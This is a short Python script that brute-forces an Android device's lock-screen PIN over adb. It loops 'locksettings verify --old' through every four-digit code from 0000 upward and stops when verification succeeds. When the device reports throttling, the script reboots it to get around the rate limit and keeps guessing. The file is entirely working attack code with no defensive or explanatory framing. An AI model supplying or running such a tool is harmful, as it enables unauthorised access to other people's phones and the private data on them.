import subprocess
import time

def send_command(command):
    result = subprocess.run(["adb", "shell", command], capture_output=True, text=True)
    if result.stderr:
        print(f"Error: {result.stderr.strip()}")
    return result.stdout

def reboot_device():
    print("Rebooting device...")
    send_command("reboot")
    print("Waiting for device to come back online...")
    time.sleep(5)  # Adjust this based on how long your device typically takes to reboot
    wait_for_device()

def wait_for_device():
    while True:
        time.sleep(2)
        result = subprocess.run(["adb", "get-state"], capture_output=True, text=True)
        if 'device' in result.stdout:
            print("Device is back online.")
            break
        print("Waiting for device...")

def should_continue(response):
    return "Lock credential verified successfully" not in response

def should_increment(response):
    return "didn't match" in response

def should_reboot(response):
    return "Request throttled" in response

base_command = "locksettings verify --old"
current_number = 0

while True:
    formatted_number = f"{current_number:04d}"
    response = send_command(f"{base_command} {formatted_number}")
    response_clean = response.strip()
    print(f"Response to '{base_command} {formatted_number}': {response_clean}")

    if not should_continue(response_clean):
        print("Lock credential verified successfully. Stopping the script.")
        break

    if should_reboot(response_clean):
        reboot_device()
        continue

    if should_increment(response_clean):
        current_number += 1

    time.sleep(.25)  # Delay between attempts
